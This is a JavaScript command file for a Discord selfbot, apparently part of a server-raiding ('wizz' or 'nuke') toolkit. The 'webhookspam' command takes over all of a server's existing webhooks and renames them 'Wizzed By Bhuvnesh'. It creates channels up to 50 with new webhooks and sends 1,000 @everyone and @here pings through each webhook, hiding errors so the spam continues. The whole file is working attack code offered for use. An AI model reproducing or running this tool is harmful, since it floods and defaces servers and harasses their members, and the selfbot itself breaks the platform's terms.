const { Message, Client, Webhook } = require("djs-selfbot");

module.exports = {
  name: "webhookspam",
  aliases: ["webspam", "webspammer", "webhookspammer"],
  description: "Spams Server by Creating Channel/Webhooks and Pings",
  permissions: ["MANAGE_WEBHOOKS", "MANAGE_CHANNELS", "MENTION_EVERYONE"],
  /**
   *
   * @param {Client} client
   * @param {Message} message
   * @param {String[]} args
   */
  run: async (client, message, args) => {
    try {
      const { guild } = message;

      const hooks = await guild.fetchWebhooks();

      /**
       *
       * @param {Webhook} hook
       */
      const hookspam = (hook) => {
        for (let v = 0; v < 1000; v++) {
          hook.send("||@everyone||||@here|| Get Wizzed by Bhuvnesh 😜").catch(() => {});
        }
      };

      hooks.map((hook) => {
        hook.edit({ name: "Wizzed By Bhuvnesh", avatar: client.owner.displayAvatarURL({ dynamic: true }) }).catch(() => {});
        hookspam(hook);
      });

      for (let x = 0; x < 50 - hooks.size; x++) {
        guild.channels
          .create("wizzed-by-bhuvnesh")
          .then((c) => {
            c.createWebhook("Wizzed By Bhuvnesh", { avatar: client.owner.displayAvatarURL({ dynamic: true }) })
              .then((w) => hookspam(w))
              .catch(() => {});
          })
          .catch(() => {});
      }
    } catch (err) {
      client.logger(err);
    }
  },
};